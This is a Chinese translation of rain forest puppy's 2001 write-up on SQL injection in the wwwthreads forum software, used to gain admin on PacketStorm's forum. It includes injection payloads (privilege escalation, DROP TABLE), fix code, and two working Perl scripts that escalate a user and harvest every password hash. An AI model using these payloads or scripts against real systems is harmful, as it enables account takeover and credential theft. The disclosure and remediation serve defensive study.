---
title: "我是如何黑掉PacketStorm论坛的"
date: 2001-03-20T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-130"
---

(quack_at_xfocus.org)

我是如何黑掉PacketStorm论坛的

                      ----通过SQL黑wwwthreads论坛


------------------------------- rain forest puppy / rfp@wiretrip.net --- 


翻译：isno


内容目录：


-1.问题的范围

-2.SQL攻击的详细解释

-3.解决办法

-4.结论

-5.本文涉及的perl程序


------------------------------------------------------------------------


----[ 1. 问题的范围


    许多应用程序都可以通过SQL来进行攻击。现在许多程序知道了避免使用strcpy()，

并且不把用户数据传递给system()调用，但是很多程序还不知道SQL查询可以被黑客

篡改来达到攻击的目的。


    写一篇技术文章要比写个安全建议麻烦得多，但是技术文章能够全面地解释我是

如何利用wwwthreads程序的漏洞得到PacketStorm论坛管理员权限和将近800个用户密

码的。


----[ 2. SQL攻击的详细解释


    某日，我正在PacketStorm的论坛上浏览，发现这个论坛使用的是wwwthreads。

我突然注意到了URL的参数（URL中'?'后面的部分）。作为一个web安全爱好者，我

对它感到极为好奇。使用试验的攻击方法，我把showpost.pl程序中的'Board=general'

参数改为了'Board=rfp'。提交并发现传回来以下错误信息：


We cannot complete your request. The reason reported was:

Can't execute query: 

SELECT B_Main,B_Last_Post

FROM rfp

WHERE B_Number=1

. Reason: Table 'WWWThreads.rfp' doesn't exist


    可以发现这儿还有一个参数'Number=1'，我们可以推断出查询请求是这样构造的：


SELECT B_Main,B_Last_Post FROM $Board WHERE B_Number=$Number


    如果你读过我在phrack 54上发表过的文章的话（可以到

[http://www.wiretrip.net/rfp/p/doc.asp?id=7&iface;=2](http://www.wiretrip.net/rfp/p/doc.asp?id=7&iface=2)阅读），你就应该明白我要

做什么了。我们不仅可以修改$Board和$Number参数，而且还可以提交额外的SQL命令。

试想一下，如果我们提交的$Board参数是下面的样子：


'general; DROP TABLE general; SELECT * FROM general '


    那么在服务器端就会转化成：


SELECT B_Main,B_Last_Post FROM general; DROP TABLE general; 

                SELECT * FROM general WHERE B_Number=$Number


    ';'符号是SQL命令的结束符。通常我们可以使用'#'来使MySQL忽略此行上的其它

内容。但是，'FROM'和'WHERE'是在一个分开的行上，所以MySQL不会忽略它。考虑到

错误的SQL语句会使MySQL忽略运行后面的语句，所以我们至少要提交一个有效的命令。

在本例中，我们提交一个和原始命令相似的generic select命令，理论上的结果应该

是删除general论坛所在的表。


    但是在实际上并没有成功，并不是因为理论是错误的，而是因为我们使用的数据

库用户没有DROP权限。并且根据wwwthreads编写的方法，它不完全允许你这么做。但

是一切并没有白费，我们可以修改其它的参数，看看哪里会出问题...而且我们可以到

[www.wwwthreads.com](http://www.wwwthreads.com/)去下载wwwthreads的源代码（免费版）。


    可以发现，免费版和正式版（PacketStorm上运行的是正式版）的代码稍微有些不

同，包括它们的SELECT声明。所以我们得有点创造性。我们先找到和前面有关的SELECT

声明。


    我喜欢使用less命令，所以我就'less showpost.pl'，并且寻找（用'/'）'SELECT'

字符串。发现了：


# Grab the main post number for this thread

$query = qq!

SELECT Main,Last_Post

FROM $Board

WHERE Number=$Number

!;


    Wow，就是它！除了几个参数的名字（Main,Last_Post,Number）和前面的（B_Main,

B_Last_Post,B_Number）不同。如果我们看看它的上面，我们会发现：


# Once and a while it people try to just put a number into the url,

if (!$Number) {

w3t::not_right("There was a problem looking up the Post...


    这就是对$Number参数的限制。


    基于这一点让我们来看看“为什么”我们要研究它。很显然我们有可能达到DROP表

这种DOS攻击，你还有可能修改其它人的发言，但那仍然不是我们要的。我们没准能建立

我们自己的论坛？所有的信息都储存在数据库里。但是有许多记录要去更新。成为一个

数据库操作员怎么样？或者更进一步，成为管理员怎么样？管理员可以增添、删除、修

改论坛、用户等。这是值得一试的，虽然你仍然将会被限制在论坛的领域里，那是一个

小的可怜的领域。


    但是，这仍然有一件事情值得为它一试。如果你注册为一个用户，你会发现你必须要

输入一个密码。Hmmm...这个密码储存在某个地方，好象是数据库里。考虑到许多人的密

码用在很多地方，而且wwwthreads（在某些配置上的错误？）把发言者的IP地址发到论坛

上。如果我们能得到某个人的密码，就可能去攻破他的主机。


    所以，让我们来看看密码是怎么存储的。进入到论坛的“编辑属性”页，有一个密码

域，通过HTML源码看，像是有一个可怕的加密密匙。妈的，这些密码是加密过的。这意味

着你需要一个密码破解软件和大量的时间去对密码进行解密。当然，这是假定你*能够*得

到密码...


    首先我们要去获得论坛管理员权限。adduser.pl程序是我们开始的好地方，因为它可

以让我们看到一个用户的全部参数。看看下面的代码：


# --------------------------------------

# Check to see if this is the first user

$query = qq!

SELECT Username

FROM Users

!;


$sth = $dbh -> prepare ($query) or die "Query syntax error: $DBI::errstr. 

        Query: $query";

$sth -> execute() or die "Can't execute query: $query. Reason:

        $DBI::errstr";

my $Status = "";

my $Security = $config{'user_security'};

my $rows = $sth -> rows;

$sth -> finish;


# -------------------------------------------------------

# If this is the first user, then status is Administrator

# otherwise they are just get normal user status.

if (!$rows){

$Status = "Administrator";

$Security = 100;

} else {

$Status = "User";

}


    这段代码所做的就是看看是否定义了用户。如果没有定义用户，增添的第一个

用户就自动得到管理员权限（Status=Administrator）和安全级别100。在这之后，

再定义的所有用户就只能得到普通用户权限（Status=User）了。所以我们要做的

就是要找到一种方法使得我们的Status=Administrator。我们可以再看看一条用户

记录的详细情况，如下：


# ------------------------------

# Put the user into the database

my $Status_q = $dbh -> quote($Status);

$Username_q = $dbh -> quote($Username);

my $Email_q = $dbh -> quote($Email);

my $Display_q = $dbh -> quote($config{'postlist'});

my $View_q = $dbh -> quote($config{'threaded'});

my $EReplies_q = $dbh -> quote("Off");

$query = qq!

INSERT INTO Users (Username,Email,Totalposts,Laston,Status,Sort,

        Display,View,PostsPer,EReplies,Security,Registered)

VALUES ($Username_q,$Email_q,0,$date,$Status_q,$config{'sort'},

        $Display_q,$View_q,$config{'postsperpage'},$EReplies_q,$Security,$date)

!;


    现在，我得花点时间来解释一下quote()函数。当把一个值为"blah blah blah"

的字符串放入"SELECT * FROM table WHERE data=$data"时，它会成为如下样子：


        SELECT * FROM table WHERE data=blah blah blah


    这个SQL语句是无效的。数据库只认第一个blah，而不知道怎么处理后边的两个blah。

所以所有的字符串数据应该被压缩进单引号里（'）。因此，查询命令应该像这样：


        SELECT * FROM table WHERE data='blah blah blah'


    这才是正确的。在我以前写的SQL安全的文章里提到过一种方法，就是使用我们自己

的单引号来打破SQL语句中的单引号。所以如果我们提交"blah blah' MORE SQL COMMANDS.."

它看起来应该是下面这个样子：


        SELECT * FROM table WHERE data='blah blah' MORE SQL COMMANDS...'

         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

         我们提交的数据


    这将使得SQL引擎把MORE SQL COMMANDS解释为实际的SQL命令，因为它把data中的第

二个单引号（我们提交的那个）当作了字符串的结束符。这是把数据转化为是人们易于

阅读的字符串的缺陷，它使得可以重解析数据...所以SQL引擎很难分辨出哪些是数据，

哪些是命令。


    这对我们来说是非常有用的。如果提交一个 ''，它并不是告诉SQL引擎这是字符串

的结尾，而是把它当作字符串中的一个单引号。因此如下的查询命令：


        SELECT * FROM table WHERE data='data''more data'


    会使得数据库去查找"data'more data"的值。所以为了避免用户突破字符串而去提

交额外的命令，程序员应该做的就是复制两个单引号（把 '变成 ''）。这能够确保提交

的数据是合法数据。这也正是DBI->quote()函数所做的――把字符串两边加上单引号，

并把用户提交的单引号复制成两个单引号。


    在解释了上面这些之后，你应该明白了所有经过了quote()函数处理过的数据就不能

被利用了，因为我们无法提交额外的SQL命令或者篡改其它有用的东西了。如果你看看源

代码会发现，wwwthreads非常广泛的使用了quote()函数，这对我们来说非常不好，但是

还有机会...


    你可以看到，域有不同的类型，包括字符串、布尔类型、多种数字类型等。字符串域

需要使用field='data'这样的格式，而数字域则不用（例如，numeric_field='2'是错误

的）。正确的数字域的用法应该是numeric_field=2。啊哈！这儿没有单引号，程序甚至

不能随意的加单引号。正确的解决办法是确保所有的数字域是真正的数字（一会儿会详细

解释）。我可以给你个提示，wwwthreads没有进行正确的检查，实际上大多数应用程序也

都没有进行正确的检查。


    所以，我们现在要提交一个能够篡改我们感兴趣的表的SQL语句。一个SELECT语句是

固定的，因此我们还需要另外一句其它的SQL语句。INSERT和UPDATE就不错，因为它们已经

可以修改数据了...我们要修改更多的数据（希望如此）。


    查找了半天之后，我发现一个非常好的可以利用的地方...changeprofile.pl。这是

一个用来把数据传递给editprofile.pl并把改动写进数据库的程序。当然，改动的只是

我们的用户的数据。这意味着要利用它，就必须注册一个用户。甭管怎么样，让我们先来

看一看：


# Format the query words

my $Password_q = $dbh -> quote($Password);

my $Email_q = $dbh -> quote($Email);

my $Fakeemail_q = $dbh -> quote($Fakeemail);

my $Name_q = $dbh -> quote($Name);

my $Signature_q = $dbh -> quote($Signature);

my $Homepage_q = $dbh -> quote($Homepage);

my $Occupation_q = $dbh -> quote($Occupation);

my $Hobbies_q = $dbh -> quote($Hobbies);

my $Location_q = $dbh -> quote($Location);

my $Bio_q = $dbh -> quote($Bio);

my $Username_q = $dbh -> quote($Username);

my $Display_q = $dbh -> quote($Display);

my $View_q = $dbh -> quote($View);

my $EReplies_q = $dbh -> quote($EReplies);

my $Notify_q = $dbh -> quote($Notify);

my $FontSize_q = $dbh -> quote($FontSize);

my $FontFace_q = $dbh -> quote($FontFace);

my $ICQ_q = $dbh -> quote($ICQ);

my $Post_Format_q= $dbh -> quote($Post_Format);

my $Preview_q = $dbh -> quote($Preview);


    靠！几乎所有的参数都被quote()处理过了。这表示所有这些参数对我们来说就都

没用了。让我们再来看看最终被写进数据库的查询语句：


# Update the User's profile

my $query =qq!

UPDATE Users

SET Password = $Password_q,

Email = $Email_q,

Fakeemail = $Fakeemail_q,

Name = $Name_q,

Signature = $Signature_q,

Homepage = $Homepage_q,

Occupation = $Occupation_q,

Hobbies = $Hobbies_q,

Location = $Location_q,

Bio = $Bio_q,

Sort = $Sort,

Display = $Display_q,

View = $View_q,

PostsPer = $PostsPer,

EReplies = $EReplies_q,

Notify = $Notify_q,

TextCols = $TextCols,

TextRows = $TextRows,

FontSize = $FontSize_q,

FontFace = $FontFace_q,

Extra1 = $ICQ_q,

Post_Format = $Post_Format_q,

Preview = $Preview_q

WHERE Username = $Username_q

!;


    因为wwwthreads自动在用quote()处理过的变量后面加了“_q”，所以我们很容易

看出来。可以看到：$Sort, $PostsPer, $TextCols, 和 $TextRows 没有被quote()处

理过。现在让我们来看看这些变量出自哪里。


my $Sort = $FORM{'sort_order'};

my $PostsPer = $FORM{'PostsPer'};

my $TextCols = $FORM{'TextCols'};

my $TextRows = $FORM{'TextRows'};


    喔，它们是直接从用户提交的数据里解析出来的。这意味着它们没有经过任何有效

性检查，这就是我们可以利用的机会了！


    在回过头来看看用户记录的结构（前面已给出），我们所要改变的是'Status'域。

在这个UPDATE查询中，Status并没有被列出。这意味着Status会保持不变。那么我们

怎么办呢？花1秒中时间想一下。


    记住，我们所要做的关键是要使我们提交的东西看起来像是数据，而最终SQL引擎

即数据库会把它解释成命令。注意一下，查询语句中域是按这种形式列出来的：

field=value, field=value, field=value, 等等（当然，它们被分隔在不同的行）。

如果我插入一些伪造的值，（处于举例的缘故）我会有：


Name='rfp', Signature='rfp', Homepage='[www.wiretrip.net/rfp/'](http://www.wiretrip.net/rfp/)


    我所要做的就是把这些值放在同一行上，去掉空格，并把它们放进字符串值里，

这是合法的SQL语句。


    现在让我们把所有一切和在一起。注意'Sort'变量，它是数字类型的，我们这样

提交：


        Bio='puppy', Sort=5, Display='threaded'


    这仍然是合法的SQL语句。因为$Sort=$FORM{'sort_order'}，这意味着要达到上

面的Sort值，我们应该提交一个sort_order=5的参数。现在我们就利用Sort来达到我

们的攻击目的。我们要做的是包含一个逗号和其它的语句。假定要改变Status域的话，

我们就应该提交一个值为"5, Status='Administrator',"的sort_order参数，当它经

过程序处理流程后，最终会变成这个样子：


        Bio='puppy', Sort=5, Status='Administrator', Display='threaded'

         ^^^^^^^^^^^^^^^^^^^^^^^^^^

         我们提交的数据


    这仍然是合法的SQL语句。而且这个语句会令数据库把Status域升级为'Administrator'！

别忘了我们前面看过的adduser.pl程序，第一个用户的安全级别是100。我们也要100的

安全级别，所以我们就把sort_order参数设置成"5, Status='Administrator', Security=100,"

那么我们就会得到：


        Bio='puppy', Sort=5, Status='Administrator', Security=100, ...


    这就更新了所有我们想要的值。数据库不知道我们的诡计，就会更新这两个域，

并把这个用户升级为论坛管理员。


    于是我们就把这种攻击技术用到了PacketStorm论坛上...结果对changeprofile.pl

请求得到了一个404错误。恩，看来前面看的那个版本没有这个问题。我又去看了看

'Edit Profile'菜单，我看它有'Basic Profile'、'Display Preferences'、和

'Email Notifications/Subscriptions'这几个demo版所没有的东西。如果它们能改变

脚本的话，它们也同样能够改变SQL查询语句（实际上它们必须能够）。于是我们现在

进入“黑盒子”状态（进行猜测性尝试，看看结果会怎样）。因为我们仍然对sort_order

参数进行尝试，你可以看到它包含在'Display Preferences'脚本里(editdisplay.pl)。

这个脚本处理sort_order, display, view, PostPer, Post_Format, Preview, TextCols,

TextRows, FontSize, FontFace, PictureView, 和 PicturePost这几个参数（通过查看

HTML源码得到）。它是参数的一个子集。使用上面的代码片段，我们可以猜到SQL查询

是什么样子的。所以马上开火！


    首先我把一些非法的值放进sort_order参数（用字符串而不是数字）。这当然将

返回错误，我们就可以检查错误信息。在第一个例子里的'Board'表前加了'B_'前缀，

'User'表前加了'U_'前缀。所以可以推断出我们应该使用'U_Status'和'U_Security'

作为域的名字。太棒了！


    为了提交一个合法的命令，我们需要提交前面列出来的所有那些值。应该指出我

们需要一个合法的用户帐号来改变它的权限。所以我们要有用户名和密码（加密过的），

从editdisplay.pl中可以发现，它们的参数应该是Username和Oldpass。于是基于上面

说过的全部，我们应该提交一个这样的URL：


changedisplay.pl? Cat=&

        Username=rfp

        &Oldpass=(加密过的密码)

        &sort_order=5,U_Status%3d'Administrator',U_Security%3d100

        &display=threaded

        &view=collapsed

        &PostsPer=10

        &Post_Format=top

        &Preview=on

        &TextCols=60

        &TextRows=5

        &FontSize=0

        &FontFace=

        &PictureView=on

        &PicturePost=off


    其中最重要的一个参数是：


    &sort_order=5,U_Status%3d'Administrator',U_Security%3d100


    这就是我们所要改变的数据库部分（%3d等于'='字符）。如果把上面的URL合成

一个字符串，你会得到：


changedisplay.pl?Cat=&Username=rfp&Oldpass=(加密过的密码)

&sort_order=5,U_Status%3d'Administrator',U_Security%3d100&display=threaded

&view=collapsed&PostsPer=10&Post_Format=top&Preview=on&TextCols=60

&TextRows=5&FontSize=0&FontFace=&PictureView=on&PicturePost=off


    这就是所有全部的东西了，于是我把它提交到PacketStorm论坛，并且得到：

    

        Your display preferences have been modified.


    再注意一下顶部上的菜单，我已经看到了'Admin'菜单。我点击了这个菜单，看到

一行令我心中温暖的信息：


As an Administrator the following options are available to you. 


    太棒了！管理员权限！看看我的选项，我可以编辑用户、留言板和论坛，指派操

作员和管理员权限，禁止用户/主机，终止/关闭/打开线程，等等。


    现在进行我们的第二个目标...密码！我进入到'Show/Edit Users'菜单，并被要求

选择我赶兴趣的用户名的第一个字母。于是我选择了‘R’，所以以R开头的用户全都

被列了出来，我选择了'rfp'。然后出现了我的加密过的密码。不幸的是，要得到全部

的用户名和密码是件极为麻烦的事，于是我就写了个perl脚本来自动做。所有得到的

密码都保存为可以直接用john the ripper来解密的形式。


----[ 3. 解决办法


    那么怎么避免出现这种问题呢？你可以看到，出现这种问题的原因在于对传给SQL

查询的数据没有做限制。虽然wwwthreads对大部分数据使用了quote()处理，但是它没有

对数字类型的数据进行处理。解决的办法就是确保传递过来的数字类型值是真正的数字

类型。你可以用如下函数来处理：


sub onlynumbers {

($data=shift)=~tr/0-9//cd;

return $data;}


    就像把字符串传递给DBI->quote()函数来处理一样，也把所有的数字类型值传递给

onlynumbers()处理。在上面的例子中，就用以下语句：


my $Sort = onlynumbers($FORM{'sort_order'});


    另一个需要验证的地方是表名。在本文开头的例子中，可以看到那个'Board=general'

参数。这个表名并没有用quote()来处理，因此我们也需要对所有的表名用一个函数来

进行处理。假设我们允许表名含有数字、字符等，可以用下面语句处理：


sub scrubtable {

($data=shift)=~tr/a-zA-Z0-9.//cd;

return $data;}


    最后要说的是，*所有*（强调是“所有”）用户传来的数据都必须经过quote()、

()、 onlynumbers() 或者 scrubtable()等来进行处理...绝对不能有例外。如果直接

把用户数据传递给SQL查询语句就会造成攻击者修改你的数据库。


    新版本的wwwthreads可以在[www.wwwthreads.com](http://www.wwwthreads.com/)，它已经修复了这个漏洞，就和

我前边所建议的一样。


----[ 4. 结论


    下面包含了两个perl程序。wwwthreads.pl用来对有漏洞的wwwthreads发起攻击

查询。你只需要知道要攻击的IP、用户名和密码。w3tpass.pl用来下载所有的wwwthreads

的用户密码，并把它们转化成可以用john the ripper来解密的格式。


感谢PacketStorm提供了这个漏洞的试验场所！


- Rain Forest Puppy / rfp@wiretrip.net


----[ 5. 本文涉及的perl程序


-[ wwwthreads.pl


#!/usr/bin/perl

# wwwthreads hack by rfp@wiretrip.net

# elevate a user to admin status

#

# by rain forest puppy / rfp@wiretrip.net

use Socket;


#####################################################

# modify these


# can be DNS or IP address

$ip="209.143.242.119";


$username="rfp";

# remember to put a '\' before the '$' characters

$passhash="\$1\$V2\$sadklfjasdkfhjaskdjflh";


#####################################################


$parms="Cat=&Username=$username&Oldpass=$passhash".

"&sort_order=5,U_Status%3d'Administrator',U_Security%3d100".

"&display=threaded&view=collapsed&PostsPer=10".

"&Post_Format=top&Preview=on&TextCols=60&TextRows=5&FontSize=0".

"&FontFace=&PictureView=on&PicturePost=off";


$tosend="GET /cgi-bin/wwwthreads/changedisplay.pl?$parms HTTP/1.0\r\n".

"Referer: http://$ip/cgi-bin/wwwthreads/previewpost.pl\r\n\r\n";


print sendraw($tosend);


sub sendraw {

my ($pstr)=@_; my $target;

$target= inet_aton($ip) || die("inet_aton problems");

socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||

die("Socket problems\n");

if(connect(S,pack "SnA4x8",2,80,$target)){

select(S); $|=1;

print $pstr; my @in=< S>;

select(STDOUT); close(S);

return @in;

} else { die("Can't connect...\n"); }}


-[ w3tpass.pl


#!/usr/bin/perl

# download all wwwthread usernames/passwords once you're administrator

# send a fake cookie with authenciation and fake the referer

# initial passwords are 6 chars long, contain a-zA-Z0-9 EXCEPT l,O,1

#

# by rain forest puppy / rfp@wiretrip.net

use Socket;


#####################################################

# modify these


# can be DNS or IP address

$ip="209.143.242.119";


$username="rfp";

# remember to put a '\' before the '$' characters

$passhash="\$1\$V2\$zxcvzxvczxcvzxvczxcv";


#####################################################


@letts=split(//,'0ABCDEFGHIJKLMNOPQRSTUVWXYZ');

print STDERR "wwwthreads password snatcher by rain forest puppy\r\n";

print STDERR "Getting initial user lists...";


foreach $let (@letts){

$parms="Cat=&Start=$let";

$tosend="GET /cgi-bin/wwwthreads/admin/showusers.pl?$parms HTTP/1.0\r\n".

"Referer: http://$ip/cgi-bin/wwwthreads/\r\n".

"Cookie: Username=$username; Password=$passhash\r\n\r\n";


my @D=sendraw($tosend);

foreach $line (@D){

if($line=~/showoneuser\.pl\?User=([^"]+)\"\>/){

push @users, $1;}}}


$usercount=@users;

print STDERR "$usercount users retrieved.\r\n".

"Fetching individual passwords...\r\n";


foreach $user (@users){

$parms="User=$user";

$tosend="GET /cgi-bin/wwwthreads/admin/showoneuser.pl?$parms HTTP/1.0\r\n".

"Referer: http://$ip/cgi-bin/wwwthreads/\r\n".

"Cookie: Username=$username; Password=$passhash\r\n\r\n";


my @D=sendraw($tosend);

foreach $line (@D){

if($line=~/OldPass value = "([^"]+)"/){

($pass=$1)=~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;

$user =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;

print $user.':'.$pass."::::::::::\n";

last;}}}


print STDERR "done.\r\n\r\n";


sub sendraw {

my ($pstr)=@_; my $target;

$target= inet_aton($ip) || die("inet_aton problems");

socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||

die("Socket problems\n");

if(connect(S,pack "SnA4x8",2,80,$target)){

select(S); $|=1;

print $pstr; my @in=< S>;

select(STDOUT); close(S);

return @in;

} else { die("Can't connect...\n"); }}


# 感谢所有使用了RDS漏洞来攻击网站的人们（只是一小撮人）


--- rain forest puppy / rfp@wiretrip.net ------------- ADM / wiretrip ---
